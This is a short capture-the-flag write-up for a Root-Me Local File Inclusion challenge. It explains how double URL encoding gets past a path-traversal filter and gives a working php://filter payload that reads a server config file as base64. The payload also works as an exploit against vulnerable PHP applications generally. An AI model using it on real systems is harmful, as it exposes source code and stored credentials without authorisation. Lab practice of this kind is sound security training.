## Challenge name: Local File Inclusion - Double Encoding

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-Encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-Encoding)

**Path traversal `../` is blocked. The server appends `.inc.php` to the page parameter.**

**Use double URL encoding to bypass filters. `../` becomes `%252E%252E%252F` (where `%25` decodes to `%`, then `%2E%2E%2F` decodes to `../`).**

**Use PHP filter wrappers with double encoding:**
```
?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf
```

**This reads `conf.inc.php` and returns it base64-encoded. Decode to get the flag.**

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
